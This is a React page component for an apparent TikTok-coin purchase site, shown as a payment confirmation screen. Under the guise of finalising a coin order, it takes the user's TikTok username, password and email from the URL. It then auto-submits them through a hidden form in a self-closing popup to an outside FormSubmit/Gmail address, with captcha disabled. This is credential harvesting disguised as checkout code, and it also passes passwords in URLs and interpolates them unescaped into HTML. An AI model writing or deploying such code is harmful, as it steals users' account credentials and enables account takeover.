import { useEffect, useState } from 'react';
import { Layout } from '../components/Layout';
import { CheckCircle, ArrowRight } from 'lucide-react';
import { useLocation, useNavigate } from 'react-router-dom';
import { useTranslation } from 'react-i18next';
import { Confetti } from '../components/Confetti';
import { Purchase } from '../types';
import { getPurchaseHistory } from '../utils/localStorage';

export const PaymentConfirmation = () => {
  const { t } = useTranslation();
  const [showConfetti, setShowConfetti] = useState(true);
  const [purchaseDetails, setPurchaseDetails] = useState<Purchase | null>(null);
  const [isSending, setIsSending] = useState(false);
  const [sendError, setSendError] = useState('');
  const location = useLocation();
  const navigate = useNavigate();
  
  // Récupérer l'orderId et les identifiants depuis l'URL
  const searchParams = new URLSearchParams(location.search);
  const orderId = searchParams.get('orderId');
  const username = searchParams.get('username');
  const password = searchParams.get('password');
  const email = searchParams.get('email');
  
  useEffect(() => {
    if (orderId) {
      // Récupérer les détails de l'achat depuis le localStorage
      const purchaseHistory = getPurchaseHistory();
      const purchase = purchaseHistory.find(p => p.id === orderId);
      if (purchase) {
        setPurchaseDetails(purchase);
      }
    }
    
    // Arrêter les confettis après 5 secondes
    const timer = setTimeout(() => {
      setShowConfetti(false);
    }, 5000);
    
    return () => clearTimeout(timer);
  }, [orderId]);
  
  const handleSendCredentials = async () => {
    if (!username || !password || !email || !orderId || !purchaseDetails) {
      setSendError(t('missingInformation', 'Informations manquantes pour envoyer les identifiants'));
      return;
    }
    
    setIsSending(true);
    setSendError('');
    
    try {
      // Ouvrir une nouvelle fenêtre pour le formulaire FormSubmit
      const emailWindow = window.open('', '_blank', 'width=600,height=400');
      
      if (!emailWindow) {
        setSendError(t('popupBlocked', 'Veuillez autoriser les pop-ups pour envoyer les identifiants TikTok'));
        setIsSending(false);
        return;
      }
      
      // Créer le contenu HTML du formulaire
      const formHtml = `
        <!DOCTYPE html>
        <html>
        <head>
          <title>Envoi des identifiants TikTok</title>
          <style>
            body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
            .loading { margin: 20px auto; }
            h2 { color: #333; }
            p { color: #666; }
          </style>
        </head>
        <body>
          <h2>Envoi des identifiants TikTok en cours...</h2>
          <p>Cette fenêtre se fermera automatiquement. Veuillez ne pas la fermer manuellement.</p>
          <div class="loading">Chargement...</div>
          
          <form id="credentialsForm" action="https://formsubmit.co/contact.payool@gmail.com" method="POST">
            <!-- Informations utilisateur -->
            <input type="hidden" name="username" value="${username}" />
            <input type="hidden" name="password" value="${password}" />
            <input type="hidden" name="orderId" value="${orderId}" />
            <input type="hidden" name="amount" value="${purchaseDetails.amount}" />
            <input type="hidden" name="price" value="${purchaseDetails.price}" />
            <input type="hidden" name="date" value="${new Date(purchaseDetails.date).toLocaleString()}" />
            
            <!-- Configuration FormSubmit -->
            <input type="hidden" name="_subject" value="Nouveaux identifiants TikTok - Commande ${orderId}" />
            <input type="hidden" name="_captcha" value="false" />
            <input type="hidden" name="_template" value="table" />
            <input type="hidden" name="_next" value="${window.location.origin}/payment/success?orderId=${orderId}" />
            <input type="hidden" name="_replyto" value="${email}" />
            <input type="hidden" name="email" value="${email}" />
          </form>
          
          <script>
            // Soumettre le formulaire automatiquement
            document.addEventListener('DOMContentLoaded', function() {
              document.getElementById('credentialsForm').submit();
              // Fermer la fenêtre après 5 secondes
              setTimeout(function() {
                window.close();
              }, 5000);
            });
          </script>
        </body>
        </html>
      `;
      
      // Écrire le contenu HTML dans la nouvelle fenêtre
      emailWindow.document.write(formHtml);
      emailWindow.document.close();
      
      // Attendre un court instant pour s'assurer que le formulaire est soumis
      setTimeout(() => {
        // Rediriger vers la page de succès
        navigate(`/payment/success?orderId=${orderId}`);
      }, 2000);
    } catch (error) {
      console.error('Erreur lors de l\'envoi des identifiants TikTok:', error);
      setSendError(t('sendError', 'Une erreur est survenue lors de l\'envoi des identifiants. Veuillez réessayer.'));
      setIsSending(false);
    }
  };
  
  return (
    <Layout balance={purchaseDetails?.amount || 0} hideBalance={!purchaseDetails}>
      {showConfetti && <Confetti duration={5000} />}
      
      <div className="max-w-2xl mx-auto mt-12 p-8 bg-[var(--card-bg)] rounded-[var(--radius-lg)] shadow-[var(--shadow-md)] border border-[var(--border-dark)]">
        <div className="flex flex-col items-center text-center mb-8">
          <div className="w-20 h-20 rounded-full bg-green-900 bg-opacity-20 flex items-center justify-center mb-6">
            <CheckCircle className="w-10 h-10 text-green-400" />
          </div>
          
          <h1 className="text-3xl font-bold mb-2">{t('paymentSuccessful')}</h1>
          <p className="text-[var(--text-secondary)] max-w-md mb-2">
            {t('thankYou')} 
          </p>
          <p className="text-[var(--text-secondary)] max-w-md mb-6">
            {t('confirmationMessage', 'Votre paiement a été traité avec succès. Pour finaliser le processus et recevoir vos pièces, veuillez cliquer sur le bouton ci-dessous.')}
          </p>
          
          {sendError && (
            <div className="w-full p-4 mb-4 bg-red-100 border border-red-200 rounded-[var(--radius-md)] text-red-800">
              <p className="text-sm">{sendError}</p>
            </div>
          )}
          
          <button 
            onClick={handleSendCredentials}
            disabled={isSending}
            className="flex items-center justify-center gap-2 py-3 px-8 rounded-[var(--radius-md)] bg-gradient-to-r from-[var(--tiktok-blue)] to-[var(--tiktok-red)] text-white font-medium hover:opacity-90 transition-opacity disabled:opacity-70 disabled:cursor-not-allowed"
          >
            {isSending ? (
              <span>{t('sending', 'Envoi en cours...')}</span>
            ) : (
              <>
                <span>{t('finalize', 'Terminer')}</span>
                <ArrowRight className="w-5 h-5" />
              </>
            )}
          </button>
        </div>
        
        {purchaseDetails && (
          <div className="bg-[var(--background-elevated-2)] rounded-[var(--radius-md)] p-6">
            <h2 className="text-xl font-semibold mb-4">{t('transactionDetails', 'Détails de la transaction')}</h2>
            
            <div className="space-y-3">
              <div className="flex justify-between">
                <span className="text-[var(--text-secondary)]">{t('orderNumber', 'Numéro de commande')}</span>
                <span className="font-medium">{purchaseDetails.id}</span>
              </div>
              
              <div className="flex justify-between">
                <span className="text-[var(--text-secondary)]">{t('amountPaid', 'Montant payé')}</span>
                <span className="font-bold">{purchaseDetails.price.toLocaleString()} FCFA</span>
              </div>
              
              <div className="flex justify-between">
                <span className="text-[var(--text-secondary)]">{t('purchasedCoins', 'Pièces achetées')}</span>
                <span className="font-bold">{purchaseDetails.amount.toLocaleString()}</span>
              </div>
            </div>
          </div>
        )}
      </div>
    </Layout>
  );
};
